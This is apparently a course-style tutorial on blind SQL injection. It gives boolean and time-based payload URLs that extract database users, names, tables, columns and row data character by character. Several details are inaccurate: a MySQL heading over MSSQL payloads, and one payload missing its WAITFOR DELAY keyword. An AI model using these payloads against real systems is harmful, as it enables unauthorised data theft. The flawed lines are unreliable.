# Blind SQL Injection – Boolean Exploitation (MySQL) #

SQL injection exploitation depends on the language used in SQL.  An attacker merges two SQL queries to get more data. 

The attacker tries to exploit the UNION operator to get more information from the database.  Blind injections help an attacker to bypass more filters easily. 

One of the main distinguishing features of blind SQL injection is that it reads the entries symbol by symbol.

▪ Example 1: Extract First Character Searching for the first character of the first table entry /?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1) )= 97,555,777)
If the table “users” contains a column “pass” and the first character of the first entry in this column is 97 (letter “a”), then DBMS will return TRUE; otherwise, FALSE.

▪ Example 2: Extract Second Character Searching for the second character of the first table entry
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),2,1) )= 97,555,777)
If the table “users” contains a column “pass” and the second character of the first entry in this column is 97 (letter “a”), then DBMS will return TRUE; otherwise, FALSE.


# Blind SQL Injection—Extract Database User #

 The attacker can probe the database server with yes/no questions to extract information. 

To extract database usernames using blind SQL injection, an attacker first tries to determine the number of characters in a database username. 

An attacker who succeeds in learning the number of characters in a username then tries to find each character in it. 

▪ Example 1: Check for username length
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--

▪ Example 2: Check if 1st character in the username contains ‘A’ (a=97), ‘B’, or ‘C’, and so on.
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--

▪ Example 3: Check if 2nd second character in the username contains ‘A’ (a=97), ‘B’, or ‘C’, and so on.
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--

▪ Example 4: Check if 3rd character in the username contains ‘A’ (a=97), ‘B’, or ‘C’, and so on.
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),3,1)))=97) WAITFOR DELAY '00:00:10'--


# SQL Injection—Extract Database Name #

Here, the attacker can apply brute force to determine the database name based on the time before the execution of the query and set the time after query execution. 

Then, the attacker can infer from the result that if the time lapse is 10 seconds, then the name is “A”; otherwise, if it is 2 seconds, then it cannot be “A.” 

Similarly, the attacker finds out the database name associated with the target web application

▪ Example 1: Check for Database Name Length and Name
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),1,1)))=97) '00:00:10'--

▪ Example 2: Extract 1st Database Table
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=3) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--


# Blind SQL Injection—Extract Column Name #

the attacker can extract the column name using the time-based blind SQL injection method.

▪ Example 1: Extract 1st Table Column Name
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP')=3) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP'),1,1)))=101) WAITFOR DELAY '00:00:10'--

▪ Example 2: Extract 2nd Table Column Name
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID')=4) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID'),1,1)))=100) WAITFOR DELAY '00:00:10'--


# Blind SQL Injection—Extract Data from ROWS #

 the attacker can extract the data from rows using the time-based blind SQL injection method.

▪ Example 1: Extract 1st Field of 1st Row
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 EID from EMP)=3) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 EID from EMP),1,1))=106) WAITFOR DELAY '00:00:10'--

▪ Example 2: Extract 2nd Field of 1st Row
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 DEPT from EMP)=4) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 DEPT from EMP),1,1))=100) WAITFOR DELAY '00:00:10'--
